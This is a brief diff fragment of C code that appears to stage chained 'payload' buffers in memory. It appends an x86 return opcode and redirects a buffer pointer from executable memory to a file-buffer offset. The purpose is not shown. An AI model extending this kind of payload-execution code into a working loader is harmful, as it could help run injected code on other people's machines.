@@ -63,7 +63,7 @@ int main(int argc, char** argv)
         nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
     }
     else
-        nextPayloadBuf = executeableMem;
+        nextPayloadBuf = myFileBuffer + myStaticLength;
         
     for (int i = 0; i < NextNum; i++)
     {
